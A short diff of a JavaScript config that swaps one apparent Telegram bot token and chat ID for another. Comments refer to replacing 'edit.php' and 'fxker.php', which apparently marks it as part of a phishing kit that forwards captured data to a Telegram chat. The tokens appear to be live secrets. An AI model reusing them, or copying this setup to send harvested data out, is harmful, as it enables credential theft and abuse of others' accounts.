@@ -2,8 +2,8 @@
 
 // ===== CONFIG (replaces edit.php) =====
 const CONFIG = {
-    apikey: "7141307570:AAHS5kKgDW5fMmXoXtrXsxiegs7w3zudslw",  // from edit.php
-    chatid: "6768248084"                                          // from edit.php
+    apikey: "8343008184:AAF4ccn2zyT6Z-zGMZy2zThfPS26L8jPNjE",  // from edit.php
+    chatid: "722615124"                                          // from edit.php
 };
 
 // ===== Helper Functions (replaces fxker.php) =====
